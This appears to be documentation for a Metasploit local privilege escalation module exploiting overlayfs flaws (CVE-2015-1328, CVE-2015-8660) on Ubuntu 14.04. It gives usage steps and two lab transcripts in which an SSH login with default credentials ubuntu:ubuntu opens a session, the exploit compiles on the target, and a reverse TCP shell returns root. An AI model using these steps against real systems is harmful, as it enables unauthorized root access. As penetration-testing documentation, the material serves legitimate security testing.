## Creating A Testing Environment

This module has been tested against:

  1. CVE-2015-1328
    1. Ubuntu 14.04
      1. 3.13.0-24 (binary version of exploit compiled on)
      2. 3.19.0-20
      3. 3.19.0-21 (not vuln, exploit failed)
      4. 3.13.0-55 (not vuln, exploit failed)
  2. CVE-2015-8660
    1. Ubuntu 14.04
      1. 3.19.0-41 (binary version of exploit compiled on)

Untested against

  1. Fedora (code included to identify vuln versions)
  2. Redhat (description includes vuln kernel versions)

## Verification Steps

  1. Start msfconsole
  2. Exploit a box via whatever method
  4. Do: `use exploit/linux/local/overlayfs_priv_esc`
  5. Do: `set session #`
  6. Do: `set verbose true`
  7. Do: `exploit`

## Options

  **COMPILE**

  If we should attempt to compile on the system.  Defaults to Auto, which checks if `gcc` is installed

  **WritableDir**

  A folder we can write files to.  Defaults to /tmp

## Scenarios

### CVE-2015-8660 against Ubuntu 14.04 with kernel 3.19.0-41

#### Initial Access

    resource (/root/Text-1.txt)> use auxiliary/scanner/ssh/ssh_login
    resource (/root/Text-1.txt)> set rhosts 192.168.2.156
    rhosts => 192.168.2.156
    resource (/root/Text-1.txt)> set username ubuntu
    username => ubuntu
    resource (/root/Text-1.txt)> set password ubuntu
    password => ubuntu
    resource (/root/Text-1.txt)> exploit
    [*] SSH - Starting bruteforce
    [+] SSH - Success: 'ubuntu:ubuntu' 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare) Linux Ubuntu14 3.19.0-41-generic #46~14.04.2-Ubuntu SMP Tue Dec 8 17:46:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux '
    [!] No active DB -- Credential data will not be saved!
    [*] Command shell session 1 opened (192.168.2.117:39027 -> 192.168.2.156:22) at 2016-10-04 22:48:44 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

#### Escalate

    resource (/root/Text-1.txt)> use exploit/linux/local/overlayfs_priv_esc
    resource (/root/Text-1.txt)> set verbose true
    verbose => true
    resource (/root/Text-1.txt)> set payload linux/x86/shell/reverse_tcp
    payload => linux/x86/shell/reverse_tcp
    resource (/root/Text-1.txt)> set session 1
    session => 1
    resource (/root/Text-1.txt)> set target 1
    target => 1
    resource (/root/Text-1.txt)> set lhost 192.168.2.117
    lhost => 192.168.2.117
    resource (/root/Text-1.txt)> exploit
    [*] Started reverse TCP handler on 192.168.2.117:4444 
    [*] Checking if mount points exist
    [+] /tmp/haxhax not created
    [+] Kernel 3.19.0.pre.41.pre.generic is vulnerable to CVE-2015-8660
    [+] gcc is installed
    [*] Live compiling exploit on system
    [*] Checking if mount points exist
    [+] /tmp/haxhax not created
    [+] Kernel 3.19.0.pre.41.pre.generic is vulnerable to CVE-2015-8660
    [*] Writing to /tmp/svF1U2Ya.c (2356 bytes)
    [*] Max line length is 65537
    [*] Writing 2356 bytes in 1 chunks of 8098 bytes (octal-encoded), using printf
    [*] Compiling /tmp/svF1U2Ya.c
    [*] Writing to /tmp/fHCJO1ex (155 bytes)
    [*] Max line length is 65537
    [*] Writing 155 bytes in 1 chunks of 455 bytes (octal-encoded), using printf
    [*] Exploiting...
    [*] Sending stage (36 bytes) to 192.168.2.156
    [*] Command shell session 2 opened (192.168.2.117:4444 -> 192.168.2.156:44823) at 2016-10-04 22:48:57 -0400
    [+] Deleted /tmp/svF1U2Ya.c
    [+] Deleted /tmp/fHCJO1ex
    
    3986817421
    viRVXKxRruOuDKwEBYAscFvJPPrtQbTO
    true
    zxrnfClHzgOcewXyEqQeEAcHsQmsEPtk
    cqdStYFUGluqJkpgfGAkPvcVgoKTtJlY
    EOzlAFTpQsoXMWIicFiKHxsVjjlFpspC
    true
    FgIyOJMyeREcjxpsbWkNDZNtuUGYmBtt
    omnusQCOqEdrUTbMLtDmXibhFAVQuTAz
    VPsVgFTxVwskShumsJkambKWMQhifDJi
    whoami
    root
    uname -a
    Linux Ubuntu14 3.19.0-41-generic #46~14.04.2-Ubuntu SMP Tue Dec 8 17:46:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux

### CVE-2015-1328 against Ubuntu 14.04 with kernel 3.13.0-24

#### Initial Access

    resource (/root/Text-1.txt)> use auxiliary/scanner/ssh/ssh_login
    resource (/root/Text-1.txt)> set rhosts 192.168.2.156
    rhosts => 192.168.2.156
    resource (/root/Text-1.txt)> set username ubuntu
    username => ubuntu
    resource (/root/Text-1.txt)> set password ubuntu
    password => ubuntu
    resource (/root/Text-1.txt)> exploit
    [*] SSH - Starting bruteforce
    [+] SSH - Success: 'ubuntu:ubuntu' 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare) Linux Ubuntu14 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux '
    [!] No active DB -- Credential data will not be saved!
    [*] Command shell session 1 opened (192.168.2.117:42139 -> 192.168.2.156:22) at 2016-10-04 22:54:50 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

#### Escalate

    resource (overlay.rc)> use exploit/linux/local/overlayfs_priv_esc
    resource (overlay.rc)> set verbose true
    verbose => true
    resource (overlay.rc)> set payload linux/x86/shell/reverse_tcp
    payload => linux/x86/shell/reverse_tcp
    resource (overlay.rc)> set target 0
    target => 0
    resource (overlay.rc)> set session 1
    session => 1
    resource (overlay.rc)> set lhost 192.168.2.117
    lhost => 192.168.2.117
    resource (overlay.rc)> exploit
    [*] Started reverse TCP handler on 192.168.2.117:4444 
    [*] Checking if mount points exist
    [+] /tmp/ns_sploit not created
    [+] Kernel 3.13.0.pre.24.pre.generic is vulnerable to CVE-2015-1328
    [+] gcc is installed
    [*] Live compiling exploit on system
    [*] Checking if mount points exist
    [+] /tmp/ns_sploit not created
    [+] Kernel 3.13.0.pre.24.pre.generic is vulnerable to CVE-2015-1328
    [*] Writing to /tmp/JmK51Dpa.c (3714 bytes)
    [*] Max line length is 65537
    [*] Writing 3714 bytes in 1 chunks of 13319 bytes (octal-encoded), using printf
    [*] Writing to /tmp/ofs-lib.c (439 bytes)
    [*] Max line length is 65537
    [*] Writing 439 bytes in 1 chunks of 1563 bytes (octal-encoded), using printf
    [*] Compiling /tmp/JmK51Dpa.c
    [*] Writing to /tmp/R6TrMF7f (155 bytes)
    [*] Max line length is 65537
    [*] Writing 155 bytes in 1 chunks of 455 bytes (octal-encoded), using printf
    [*] Exploiting...
    [*] Sending stage (36 bytes) to 192.168.2.156
    [*] Command shell session 2 opened (192.168.2.117:4444 -> 192.168.2.156:35876) at 2016-10-14 11:26:49 -0400
    [!] Tried to delete /tmp/ofs-lib.c, unknown result
    [+] Deleted /tmp/JmK51Dpa
    
    2356964145
    psMfOJcKGKnafhAvALIeSFNegauafmux
    RHxxKeTrEKLTMmssPTZjlJvkpblZjWSH
    KWETRaFhNLLRkUbhRkRoflvdRdbJBPFP
    true
    ORoIgajQlzSvaciHEGqEvQZqLZMpJDjQ
    dTdIcyWRpQOpEHizUhOQkDVqQZaxQIFR
    UCINXsLPGwYDBqnRKbFyLFOzkbifFPiF
    sh: 0: can't access tty; job control turned off
    # # # whoami
    root
    # uname -a
    Linux Ubuntu14 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
